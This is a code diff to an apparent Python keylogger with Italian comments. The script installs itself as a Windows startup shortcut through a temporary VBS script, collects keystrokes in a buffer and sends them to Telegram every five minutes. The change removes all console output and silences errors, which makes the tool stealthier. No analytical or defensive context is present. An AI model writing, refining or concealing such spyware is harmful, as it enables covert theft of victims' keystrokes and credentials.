@@ -14,10 +14,7 @@ def crea_collegamento_avvio(nome_collegamento, percorso_script_pyw):
     # --- LOGICA DI CONTROLLO ---
     try:
         if os.path.exists(path_collegamento):
-            print(f"ℹ️ Il collegamento '{nome_collegamento}' esiste già. Salto la creazione.")
             return # Esci dalla funzione, non serve fare altro
-        
-        print(f"🚀 Collegamento non trovato. Creazione in corso...")
         
         # 3. Script VBS temporaneo per creare il collegamento
         vbs_script = f'''
@@ -38,10 +35,8 @@ def crea_collegamento_avvio(nome_collegamento, percorso_script_pyw):
         os.system(f"cscript //nologo {vbs_file}")
         os.remove(vbs_file)
         
-        print(f"✅ Collegamento creato con successo!")
-        
     except Exception as e:
-        print(f"❌ Errore durante l'operazione: {e}")
+        return
 
 def invia_telegram(testo):
     """Funzione sincrona per inviare messaggi (usando requests per semplicità nel thread)"""
@@ -51,7 +46,7 @@ def invia_telegram(testo):
     try:
         requests.post(url, json=payload)
     except Exception as e:
-        print(f"Errore invio: {e}")
+        return
 
 def controlla_e_invia():
     """Funzione che unisce l'array, lo invia e lo svuota"""
@@ -103,7 +98,6 @@ buffer_tasti = []
 lock = threading.Lock() # Per evitare conflitti tra i thread quando leggiamo/svuotiamo l'array
 
 if __name__ == '__main__':
-    print("Script in esecuzione...")
     
     # Avvia il thread per il controllo temporale (5 min)
     t = threading.Thread(target=timer_background, daemon=True)
